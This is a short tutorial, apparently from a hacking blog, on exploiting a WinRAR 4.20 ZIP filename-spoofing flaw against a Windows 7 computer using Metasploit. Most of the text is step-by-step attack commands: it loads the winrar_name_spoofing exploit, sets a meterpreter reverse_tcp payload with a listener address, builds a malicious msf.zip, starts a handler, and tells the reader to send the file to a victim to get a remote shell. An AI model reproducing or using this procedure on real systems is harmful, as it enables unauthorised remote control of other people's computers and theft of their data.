Hack Remote Windows PC using WinRAR Filename Spoofing

This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from the central directory, but the file names used to extract and open contents come from the Local File Header. This inconsistency allows to spoof file names when opening ZIP files with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in March 2014
WinRAR 4.20
Attacker: kali Linux
Victim PC: Windows 7
Open Kali terminal type msfconsole

Now type use exploit/windows/fileformat/winrar_name_spoofing
msf exploit (winrar_name_spoofing)>set payload windows/meterpreter/reverse_tcp
msf exploit (winrar_name_spoofing)>set lhost 192.168.1.7 (IP of Local Host)
msf exploit (winrar_name_spoofing)>exploit

After we successfully generate the malicious zip File, it will stored on your local computer
/root/.msf4/local/msf.zip

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.7
exploit
Now send your msf.zip files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
